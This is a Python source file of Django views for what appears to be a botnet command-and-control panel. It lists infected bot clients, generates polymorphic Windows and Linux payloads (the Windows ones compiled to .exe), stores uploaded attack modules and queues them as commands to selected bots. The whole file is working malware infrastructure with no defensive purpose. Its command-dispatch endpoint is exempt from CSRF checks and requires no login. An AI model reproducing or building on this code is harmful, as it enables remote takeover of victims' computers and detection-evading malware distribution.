from django.http import HttpResponse, JsonResponse
from django.template import loader
from django.shortcuts import render, redirect, get_object_or_404
from django.contrib.auth import authenticate, login, logout
from django.core.files.storage import FileSystemStorage
from django.contrib.auth.decorators import login_required
from django.contrib import messages
from control.models import Client, Payload, Module, Command
import subprocess
import os
import time
from django.views.decorators.csrf import csrf_exempt
import json


@login_required
def panel(request):
    clients = Client.objects.all()
    modules = Module.objects.all()
    template = loader.get_template('panel.html')
    context = {
        'clients': clients,
        'modules': modules,
    }
    return HttpResponse(template.render(context, request))

@login_required
def payloads(request):
    if request.method == 'POST':
        os_type = request.POST.get('os')
        format_type = request.POST.get('format')

        if os_type == 'windows' and format_type == 'exe':
            script_path = os.path.join(os.path.dirname(__file__), '../client/compiler.py')
            script_name = 'polymorphic_main.py'
            exe_name = f'winpayload_{Payload.objects.filter(os="windows", format="exe").count() + 1}.exe'

            polymorphism_result = subprocess.run(['python3', './client/polymorphism.py'])
            if polymorphism_result.returncode != 0:
                payloads = Payload.objects.all()
                return render(request, 'payloads.html', {'status': 'error', 'message': "Polymorphism script failed!", "payloads": payloads})

            time.sleep(3)
            compile_result = subprocess.run(['python3', script_path, script_name, exe_name])
            if compile_result.returncode != 0:
                payloads = Payload.objects.all()
                return render(request, 'payloads.html', {'status': 'error', 'message': "Compilation failed!", "payloads": payloads})

            payload_path = os.path.join('compiled_payloads', exe_name)
            payload = Payload(os=os_type, format=format_type, file_path="../../" + payload_path)
            payload.save()
            payloads = Payload.objects.all()
            return render(request, 'payloads.html', {'status': 'success', 'message': "Payload successfully generated!", "payloads": payloads})

        elif (os_type == 'windows' or os_type == "linux") and format_type == 'py':
            polymorphism_result = subprocess.run(['python3', './client/polymorphism.py'])
            if polymorphism_result.returncode != 0:
                payloads = Payload.objects.all()
                return render(request, 'payloads.html', {'status': 'error', 'message': "Polymorphism script failed!", "payloads": payloads})

            time.sleep(3)

            script_name = './client/polymorphic_main.py'
            unique_name = f'{os_type}_payload_{Payload.objects.filter(os=os_type, format="py").count() + 1}.py'
            compiled_path = os.path.join('compiled_payloads', unique_name)

            try:
                os.rename(script_name, compiled_path)
            except OSError as e:
                payloads = Payload.objects.all()
                return render(request, 'payloads.html', {'status': 'error', 'message': f"Failed to rename script: {str(e)}", "payloads": payloads})

            payload = Payload(os=os_type, format=format_type, file_path="../../" + compiled_path)
            payload.save()
            payloads = Payload.objects.all()
            return render(request, 'payloads.html', {'status': 'success', 'message': "Payload successfully generated!", "payloads": payloads})

        else:
            payloads = Payload.objects.all()
            return render(request, 'payloads.html', {'status': 'error', 'message': "Invalid os/type combination!", "payloads": payloads})

    payloads = Payload.objects.all()
    return render(request, 'payloads.html', {'payloads': payloads})

@login_required
def modules(request):
    if request.method == 'POST':
        name = request.POST.get('name')
        description = request.POST.get('description')
        argument_names = request.POST.getlist('argument_name[]')
        argument_types = request.POST.getlist('argument_type[]')
        script_file = request.FILES['script_file']

        required_arguments = {name: arg_type for name, arg_type in zip(argument_names, argument_types)}

        fs = FileSystemStorage(location='uploaded_scripts/')
        filename = fs.save(script_file.name, script_file)
        script_path = fs.url(filename)

        module = Module(
            name=name,
            description=description,
            required_arguments=required_arguments,
            script_path=script_path
        )
        module.save()

        return redirect('modules')

    modules = Module.objects.all()
    return render(request, 'modules.html', {'modules': modules})

@csrf_exempt
def send_command_to_clients(request):
    if request.method == 'POST':
        try:
            data = json.loads(request.body)
            client_ids = data.get('clients', [])
            module_id = data.get('module_id')
            arguments = data.get('arguments', {})

            if not client_ids or not module_id:
                return JsonResponse({'error': 'Invalid input: Missing clients or module.'}, status=400)

            module = get_object_or_404(Module, id=module_id)
            selected_clients = Client.objects.filter(id__in=client_ids)

            for client in selected_clients:
                Command.objects.create(
                    bot=client,
                    command=module.name,
                    payload_url=module.script_path,
                    args=json.dumps(arguments)
                )

            return JsonResponse({'status': 'success'}, status=200)

        except Exception as e:
            return JsonResponse({'error': str(e)}, status=400)

def login_view(request):
    if request.method == 'POST':
        username = request.POST['username']
        password = request.POST['password']
        user = authenticate(request, username=username, password=password)
        if user is not None:
            login(request, user)
            return redirect('panel')
        else:
            messages.error(request, 'Invalid username or password')
    return render(request, 'login.html')

def logout_view(request):
    logout(request)
    return redirect('login')